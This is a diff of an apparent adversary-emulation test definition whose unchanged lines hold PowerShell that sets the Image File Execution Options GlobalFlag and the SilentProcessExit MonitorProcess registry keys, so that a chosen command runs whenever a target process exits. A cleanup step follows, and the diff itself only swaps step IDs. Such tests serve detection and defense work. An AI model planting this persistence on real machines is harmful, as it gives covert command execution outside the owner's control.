@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "305e8575-e4ea-4705-b4e9-aeede0a648c2",
+      "id": "57b24875-8de5-42c2-87b1-b75d68e8f698",
       "type": "execute-command",
       "data": {
         "command": "$Name = \"GlobalFlag\"\n$Value = \"512\"\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nNew-Item -Path $registryPath -Force\nNew-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force\n$Name = \"ReportingMode\"\n$Value = \"1\"\n$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\"\nNew-Item -Path $SilentProcessExit -Force\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force \n\n$Name = \"MonitorProcess\"\n$Value = \"#{cmd_to_run}\"\nNew-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force\nStart-Process whoami.exe\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "da3a3731-75dd-465c-9542-10c7fb765864",
+      "id": "39083be9-f39c-4d88-a529-157bfacafed4",
       "type": "execute-command",
       "data": {
         "command": "$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{process}\" \nRemove-Item $SilentProcessExit -force\n$registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{process}\"\nRemove-Item $registryPath -force\n",
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "305e8575-e4ea-4705-b4e9-aeede0a648c2",
+      "s": "57b24875-8de5-42c2-87b1-b75d68e8f698",
       "p": "on-success",
-      "o": "da3a3731-75dd-465c-9542-10c7fb765864"
+      "o": "39083be9-f39c-4d88-a529-157bfacafed4"
     },
     {
-      "s": "305e8575-e4ea-4705-b4e9-aeede0a648c2",
+      "s": "57b24875-8de5-42c2-87b1-b75d68e8f698",
       "p": "on-failure",
-      "o": "da3a3731-75dd-465c-9542-10c7fb765864"
+      "o": "39083be9-f39c-4d88-a529-157bfacafed4"
     }
   ],
   "tags": [
